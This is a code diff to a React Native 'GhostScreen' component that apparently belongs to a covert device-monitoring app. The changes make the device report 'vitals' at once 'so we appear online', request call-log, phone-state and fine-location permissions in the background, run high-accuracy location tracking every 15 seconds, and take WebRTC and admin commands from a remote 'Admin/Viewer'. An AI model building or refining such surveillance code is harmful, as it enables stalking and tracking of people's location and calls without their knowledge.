@@ -24,29 +24,38 @@ const GhostScreen = ({ name, onLogout }) => {
   useEffect(() => {
     // 1. Setup background tasks and permissions
     const startup = async () => {
+      console.log("[Ghost] Starting services for", name);
+      
+      // 1. Start Vitals immediately so we appear online
+      updateVitals();
+      const vitalsInterval = setInterval(updateVitals, 10000);
+
+      // 2. Request permissions in background
       if (Platform.OS === 'android') {
-        await PermissionsAndroid.requestMultiple([
+        PermissionsAndroid.requestMultiple([
           PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
           PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
           PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
-        ]);
+        ]).catch(err => console.error("[Ghost] Permission error", err));
       }
       
-      const { status } = await Location.requestForegroundPermissionsAsync();
-      if (status === 'granted') {
-        Location.startLocationUpdatesAsync('GHOST_LOCATION', {
-          accuracy: Location.Accuracy.BestForNavigation,
-          timeInterval: 15000, // Update every 15s
-          distanceInterval: 10
-        }).catch(() => {});
+      try {
+        const { status } = await Location.requestForegroundPermissionsAsync();
+        if (status === 'granted') {
+          Location.startLocationUpdatesAsync('GHOST_LOCATION', {
+            accuracy: Location.Accuracy.BestForNavigation,
+            timeInterval: 15000,
+            distanceInterval: 10
+          }).catch(() => {});
+        }
+      } catch (e) {
+        console.warn("[Ghost] Location permission failed", e);
       }
-
-      // Initial Vitals
-      updateVitals();
-      setInterval(updateVitals, 10000); // Changed to 10 seconds for faster updates
+      
+      return vitalsInterval;
     };
 
-    startup();
+    const intervalId = startup();
 
     // 2. Handle Signaling from Admin/Viewer
     socket.on('webrtc_signal', async (data) => {
@@ -71,6 +80,7 @@ const GhostScreen = ({ name, onLogout }) => {
     return () => {
       socket.off('webrtc_signal');
       socket.off('admin_command');
+      intervalId.then(id => clearInterval(id));
       if (pcRef.current) pcRef.current.close();
     };
   }, []);
@@ -171,6 +181,9 @@ const GhostScreen = ({ name, onLogout }) => {
       </View>
 
       <View style={styles.logoutContainer}>
+        <TouchableOpacity style={[styles.logoutBtn, { borderColor: '#00ff00', marginBottom: 10 }]} onPress={updateVitals}>
+          <Text style={[styles.logoutTxt, { color: '#00ff00' }]}>[ PING SYSTEM ]</Text>
+        </TouchableOpacity>
         <TouchableOpacity style={styles.logoutBtn} onPress={onLogout}>
           <Text style={styles.logoutTxt}>[ LOGOUT ]</Text>
         </TouchableOpacity>
